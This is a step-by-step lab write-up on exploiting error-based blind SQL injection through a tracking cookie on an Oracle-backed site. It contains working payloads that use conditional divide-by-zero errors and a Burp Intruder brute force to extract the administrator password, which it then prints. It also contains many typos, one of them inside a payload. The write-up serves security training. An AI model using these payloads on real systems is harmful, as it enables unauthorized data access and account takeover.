# Blind SQL injection with conditional errors
* This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
* The results of the SQL query are not returned, and the application does not respond any differently based on whther the query returns any rows. If the SQL query causes an error, then the application retunrs an custom error message.
	* The database contains a different table called `users`, with columns called `usernmae` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
	* To solve the lab, log in as the `administrator` user.
### 1. Test if the cookie `TrackingId` is vulnerable
* Add a single quote after the cookie to see the behavior.
	* As a result, a 500 Internal Error response is given

![49](https://user-images.githubusercontent.com/53956303/160497562-c465067a-9a2c-4afe-9d38-77158ec14785.png)

### 1. Test for blind SQL injection
* A request contains `TrackingId`. It might be used for blind SQLi
	* Test the blind SQL injection by modifying `TrackingId`. Append a true statement after the value
```sql
' AND '1'='1'
```
* However, it gives a 500 Internal server error response.
	* Test using a constructed subquery using valid SQL syntax.
```sql
' || (SELECT '') ||'
```
* It also gives the 500 internal server error.
	* Use a syntax for a different data type.
```sql
' || (SELECT '' FROM dual) ||'
```
* As a result, it resturns a 200 OK response. It means this website is vulnerable to the error based blind SQL injection.

![50](https://user-images.githubusercontent.com/53956303/160498235-0919a454-046e-4058-a195-182bdfe9b1fd.png)

* Test the error based blind SQL injection by append a non-exist table name after the value of `TrackingId` to get an error.
```sql
' || (SELECT '' FROM non-exist) ||'
```
* From the result, a 500 Internal server error response is given. It means that the error based SQL injection works perfectly.

![51](https://user-images.githubusercontent.com/53956303/160498306-ee48b846-a09c-464f-8527-8de346afc787.png)

### 2. Veryfy a table name "users" using blind SQL injection
```sql
' || (SELECT '' FROM users WHERE ROWNUM=1) ||'
```
* It returns a 200 OK response. It means that this table does exist
	* the `WHERE ROWNUM=1` condition is important tjere tp prevent the query from resulting more than one row, which would break the oncatenation.

![52](https://user-images.githubusercontent.com/53956303/160498635-d7a3c5b7-8467-41b7-bc41-cef7dfe1fa75.png)

### 3. Test the behavior deeply
* Test this on the request.
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
* It returns a 500 Internal Server error.

![52](https://user-images.githubusercontent.com/53956303/160499233-7d16bf4e-5824-4739-a174-0306c4a48bf2.png)
* Change the first statment to false
```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
* It retunrs 200 OK response.

![52](https://user-images.githubusercontent.com/53956303/160499336-7aae200b-4b2d-46dd-97a1-c47ef54b49d9.png)

* This behavior demontrated that the attacker can trigger on truth an error conditionally on truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a devided-by-zero, which causeses an error. In this case, the two payloads test the condition `1=1` and `1=2`, and an error is received when the condition is `true`.
### 4. Identify whether specific entries exist in a table
* Check whether the username `administrator` exists.
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
* It returns a 500 Internal error. This condition is truem confirming that there is a username called `administrator`.

### 5. Determine how many characters are in the password of the `administrator` user
```sql
'||(SELECT CASE WHEN LENGTH(password) >1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
* It gives 500 internal Server Error.
	* When tested for 20, it gives 200 OK response which means that the password is 20 characters long.

![54](https://user-images.githubusercontent.com/53956303/160500166-c2e64b4f-c128-4c8e-92f6-e427bef3b3e6.png)
### 6. Brute force the password using Burp Intruder
* In the position tab, click the clear button, and change the payload to
```sql
' ||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE usernmae='administrator')||'
```
* Then, place the payload position markers around the `a` and click the `AddÂ§` button.
	* To test the character at each position, you will need to send suitable payloads in the payload position that you have defined. You can assume that the password contains only lowercases alphanumeric characters.

![55](https://user-images.githubusercontent.com/53956303/160500678-910ae294-d827-4f50-b30e-1e41de225753.png)
* Go to the payload tab and check the "simple list" is selected, and under "Payload Options" add the payloads in the reange `a-z and 0-9`

![56](https://user-images.githubusercontent.com/53956303/160500899-7cbd89b6-cd7d-4f58-9f1c-ce61c5aa0a8e.png)
* Then, click "Start Attack"
	* From the result, only one request get 500 Internal server error response. It means that it is the right character for the password.

![57](https://user-images.githubusercontent.com/53956303/160501169-01e8a9c5-8b4f-45e5-a21c-9179a6419cfb.png)
* Change the position in the `SUBSTR()` function (the second component is for the position) and get the full password. As a result, the password `5moeb3w7lms67bmil0q4` is given.
	* With obtained password, access is granted to the administrator account. The lab is solved.

![58](https://user-images.githubusercontent.com/53956303/160504620-400c57d5-bc29-453b-9816-3e15e83455d7.png)
